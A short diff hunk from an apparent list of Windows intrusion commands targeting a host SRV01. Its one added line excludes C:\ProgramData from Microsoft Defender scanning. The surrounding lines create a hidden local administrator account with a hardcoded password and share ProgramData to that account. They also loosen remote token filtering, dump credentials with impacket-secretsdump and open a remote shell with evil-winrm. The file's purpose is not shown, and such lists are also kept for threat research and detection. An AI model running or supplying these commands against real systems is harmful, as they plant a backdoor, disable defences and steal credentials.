@@ -1764,6 +1764,7 @@ Invoke-Command -ComputerName SRV01 -ScriptBlock { arp /a }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { ipconfig /all }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name programdata -Path "C:\ProgramData" -FullAccess dbf }
+Invoke-Command -ComputerName SRV01 -ScriptBlock { Add-MpPreference -ExclusionPath "C:\ProgramData" }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
